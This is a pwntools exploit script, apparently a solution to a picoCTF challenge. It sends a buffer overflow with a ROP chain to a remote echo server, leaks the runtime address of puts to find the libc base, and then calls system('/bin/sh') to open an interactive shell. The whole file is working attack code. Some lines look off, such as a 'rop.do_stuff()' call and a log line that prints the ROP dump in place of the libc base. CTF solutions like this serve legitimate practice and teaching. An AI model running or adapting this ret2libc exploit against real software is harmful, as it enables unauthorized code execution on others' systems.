#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln_patched_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
offset = 136

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mercury.picoctf.net", 24159)

    return r


def main():
    r = conn()
    rop = ROP(exe)

    log.info("puts() address in GOT: {}".format(hex(exe.got['puts'])))

    rop.call('puts', [exe.got['puts']])
    rop.do_stuff()

    log.info("First ROP chain:\n{}".format(rop.dump()))

    payload = fit({
        offset: bytes(rop)
    })

    log.info("Sending payload\n{}".format(hexdump(payload)))

    r.sendlineafter("WeLcOmE To mY EcHo sErVeR!\n", payload)
    r.recvline()

    puts_addr = int.from_bytes(r.recvline(keepends=False), byteorder='little')
    log.info("puts() runtime address: {}".format(hex(puts_addr)))

    libc_base = puts_addr - libc.symbols['puts']
    assert(libc_base & 0xFFF == 0)
    log.info("LibC runtime base address: {}".format(rop.dump()))

    libc.address = libc_base

    rop = ROP(exe)
    rop.call('puts', [exe.got['puts']])
    rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh"))])
    log.info("Second ROP chain:\n{}".format(rop.dump()))

    payload = fit({
        offset: bytes(rop)
    })

    log.info("Sending payload:\n{}".format(hexdump(payload)))

    r.sendline(payload)
    r.recvline()
    r.recvline()

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
